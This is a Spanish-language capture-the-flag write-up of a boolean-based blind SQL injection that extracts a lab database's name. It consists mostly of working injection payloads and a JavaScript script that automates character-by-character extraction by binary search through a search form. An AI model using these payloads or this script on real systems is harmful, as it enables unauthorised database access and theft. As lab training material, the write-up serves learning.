# CTF Boolean-Based Blind SQL Injection

## Información
- **Tipo**: Boolean-Based Blind SQL Injection
- **Objetivo**: Extraer el nombre de la base de datos

## Paso 1: Confirmación del Motor de Base de Datos

**Comando de prueba:**
```sql
' OR (SELECT database()) IS NOT NULL -- 
```

**Resultado**: `true` → Confirmado **MySQL/MariaDB**

> **Nota**: Para otros motores se usaría:
> - PostgreSQL: `current_database()`
> - SQL Server: `DB_NAME()`
> - SQLite: `pragma_database_list`

## Paso 2: Configuración de la Función Tester

**Función JavaScript para automatizar las pruebas:**
```javascript
const test = (payload) =>
  fetch(location.href,{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'search='+encodeURIComponent(payload)
  }).then(r=>r.text()).then(h=>/in stock/i.test(h)); // true = "in stock"
```

**Pruebas de validación:**
```javascript
await test(`' OR 1=1 -- `);   // true
await test(`' OR 1=2 -- `);   // false
```

## Paso 3: Extracción de la Longitud del Nombre de la BD

**Función de búsqueda binaria para longitud:**
```javascript
async function dbLen() {
  let lo = 1, hi = 64;
  while (lo < hi) {
    const mid = Math.floor((lo+hi+1)/2);
    if (await test(`' OR LENGTH(database())>=${mid} -- `)) lo = mid;
    else hi = mid-1;
  }
  return lo;
}
```

**Ejecución:**
```javascript
const length = await dbLen();
console.log('Longitud de la BD:', length);
```

## Paso 4: Extracción de Cada Carácter

**Función para obtener carácter por posición:**
```javascript
async function charAt(pos) {
  let lo = 32, hi = 122; // rango ASCII visible
  while (lo < hi) {
    const mid = Math.floor((lo+hi+1)/2);
    if (await test(`' OR ASCII(SUBSTRING(BINARY database(),${pos},1))>=${mid} -- `)) lo = mid;
    else hi = mid-1;
  }
  return String.fromCharCode(lo);
}
```

## Paso 5: Reconstrucción del Nombre Completo

**Script principal para extraer el nombre:**
```javascript
(async () => {
  const L = await dbLen();
  let name = '';
  for (let i=1; i<=L; i++) {
    name += await charAt(i);
    console.log('→', name);
  }
  console.log('DATABASE =', name);
})();
```

## Resultado

✅ **Nombre de la base de datos**: `echo_store`

## Resumen

| Paso | Comando | Propósito |
|------|---------|-----------|
| 1 | `' OR (SELECT database()) IS NOT NULL -- ` | Detectar motor MySQL/MariaDB |
| 2 | `' OR 1=1 -- ` | Validar inyección booleana (true) |
| 3 | `' OR LENGTH(database())>=${mid} -- ` | Obtener longitud del nombre BD |
| 4 | `' OR ASCII(SUBSTRING(BINARY database(),${pos},1))>=${mid} -- ` | Extraer cada carácter |

## Técnicas

- **Boolean-Based Blind SQLi**: Explotación basada en respuestas true/false
- **Búsqueda Binaria**: Optimización para reducir número de requests
- **Extracción ASCII**: Conversión de códigos ASCII a caracteres
- **Automatización JavaScript**: Scripts para acelerar el proceso

## Notas

- Se utilizó `BINARY` en la función `SUBSTRING` para evitar problemas de case sensitivity
- El rango ASCII (32-122) cubre todos los caracteres visibles comunes
- La función `test()` detecta el patrón "in stock" como indicador de condición verdadera
- La búsqueda binaria reduce el tiempo de ejecución comparado con fuerza bruta

---
